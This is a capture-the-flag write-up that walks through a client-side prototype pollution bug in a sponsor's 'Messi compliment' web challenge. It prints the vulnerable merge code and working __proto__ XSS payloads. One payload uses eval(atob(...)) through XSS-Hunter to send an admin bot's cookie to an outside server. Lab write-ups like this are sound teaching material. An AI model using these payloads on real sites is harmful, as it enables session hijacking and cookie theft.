# Kulkan

## Description
```
A Messi compliment engine for Messi fans is here at penetration-testing.com

Kulkan Security delivers penetration testing and vulnerability assessment services to International markets. Our team of security experts will plan and execute controlled attacks and partner up with your company in an effort to identify, mitigate and remediate security vulnerabilities.
```

## Writeup

Taking a look at the website.
![grafik](https://github.com/Aryt3/writeups/assets/110562298/61334258-1a1c-4ed0-8543-42c9997f874e)

Starting off we have a lot of input but up front I was able to terminate a lot of possibilities on what the vulnerability might be. <br/>
This was a challenge provided by a sponsor company and therefore everyone was attacking the same website. <br/>
Knowing this I can exclude almost every server-side vulnerability. <br/>

![grafik](https://github.com/Aryt3/writeups/assets/110562298/8edef8ff-d58d-4604-8b07-5befe7c58241)
Clicking on the Admin Bot I instantly realize that this should be some kind of XSS exploit because an "admin bot" will visit the URL we provide. <br/>
Taking a look at the logic from the homepage: <br/>
```js
const params = new URLSearchParams(window.location.search);
document.getElementById("input_json").value = params.get("input_json") || "";

let randomObject = {};

function mergeObjects(target, source) {
  for (let key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      if (!target[key]) {
        target[key] = {};
      }
      mergeObjects(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

function applyUpdate() {
  const configStr = document.getElementById("input_json").value;
  let config = {};

  try {
    config = JSON.parse(configStr);
  } catch (e) {
    console.log("Invalid JSON, you can do better for Messi.");
    return;
  }

  // Hey, you're doing a great job if you're here reviewing code. You've got this!
  let defaultConfig = { color: "blue", fontSize: "16px" };
  mergeObjects(defaultConfig, config);

  const complimentDiv = document.getElementById("compliment");

  if (defaultConfig.compliment) {
    complimentDiv.innerText = defaultConfig.compliment;
  }
  if (defaultConfig.color) {
    complimentDiv.style.color = defaultConfig.color;
  }
  if (defaultConfig.fontSize) {
    complimentDiv.style.fontSize = defaultConfig.fontSize;
  }
  if (randomObject.win) {
    complimentDiv.innerHTML = randomObject.win;
  }
}

applyUpdate();
```

Here we see some interesting things like the possible input parameter. <br/>
Executing the function on the homepage normally we receive this output: <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/45fc44d6-b9be-4505-9384-4897197c56d2)

Inspecting the code above I was able to determine that we can just input the same json payload into the URL. <br/>
```
https://www.penetration-testing.com/?input_json={   "compliment": "I'm in pain!",   "color": "purple",   "fontSize": "49px" }
```
Visiting the URL above we also receive the output below 
![grafik](https://github.com/Aryt3/writeups/assets/110562298/29cabb3b-0871-4081-a89a-374f806e5b73)

Remembering that the admin bot can only visit the its' own URL we should be able to forge some kind of URL parameter which reads sensitive data like the cookie and pass it along to my server. <br/>
Before that though we need to find a way to execute XSS. <br/>
I was able to come up wit ha vulnerability after reloading the homepage. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/1d19f43c-dc5a-4a52-ac76-d3b176312c5f)

Seeing the message below I was able to identify something strange. <br/>
`Prototype` and `Pollutes` are kind of weird words to use in this context. <br/>
After make a quick browser search I found an interesting article about `Prototype Pollution`. <br/>
This seems to be a server and client side vulnerability therefore useable for us. (https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)<br/>

After some trying around and more inspection of the javascript code I came up with the following payload which uses prototype pollution to execute malicious javascript code via the json parameter provided. <br/>
```json
{   "compliment": "no comment!",
    "__proto__":
    {     "win": "<img src=x onerror=\"javascript:alert('Get some of this payload!')\">"   }
}
```

Accessing the URL with the parameter above: <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/dbc26ccd-3f9a-4b09-a856-d175b6467db4)

The easiest way now is to just use `XSS-Hunter` a free online tool for XSS based attacks because it doesn't only check for cookies it basically checks every XSS exploit possible. (https://xsshunter.trufflesecurity.com/app/)<br/>
```json
{   "compliment": "no comment!",
    "__proto__":
    {     "win": "<img src=x id=[REDACTED] onerror=eval(atob(this.id))>"   }
}
```

Inputing the URL with the parameter above we execute a working XSS attack. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/098e6152-08cb-4334-8877-830daca12681)

Looking at `XSS-Hunter Payload Fire` we see the executed attack and the response of the server with the flag being stored in the `document.cookie`. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/10aac83a-db01-4bc0-b853-57547aeaec83)

Overall a nice challenge with some interesting vulnerability. 


